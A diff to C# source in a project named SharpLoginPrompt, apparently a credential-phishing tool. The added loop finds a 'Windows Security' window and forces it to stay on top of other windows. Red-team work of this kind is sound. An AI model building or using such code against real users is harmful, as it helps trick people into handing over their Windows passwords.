@@ -121,7 +121,22 @@ namespace SharpLoginPrompt
                     Process procesInfo = Process.GetCurrentProcess();
                     IntPtr handle = procesInfo.MainWindowHandle;
                     SetWindowPos(handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW | SWP_NOSENDCHANGING | SWP_NOREPOSITION);
-                    
+                    foreach (ProcessThread threadInfo in procesInfo.Threads)
+                    {
+                        //Console.WriteLine("\tthread {0:x}", threadInfo.Id);
+                        IntPtr[] windows = GetWindowHandlesForThread(threadInfo.Id);
+                        if (windows != null && windows.Length > 0)
+                            foreach (IntPtr hWnd in windows)
+                            {
+                                //Console.WriteLine("\t\twindow {0:x}", hWnd.ToInt32());
+                                if (GetTextfromwindow(hWnd) == "Windows Security")
+                                {
+                                    SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW | SWP_NOSENDCHANGING | SWP_NOREPOSITION);
+                                }
+                            }
+
+                    }
+
                 }
 
             });
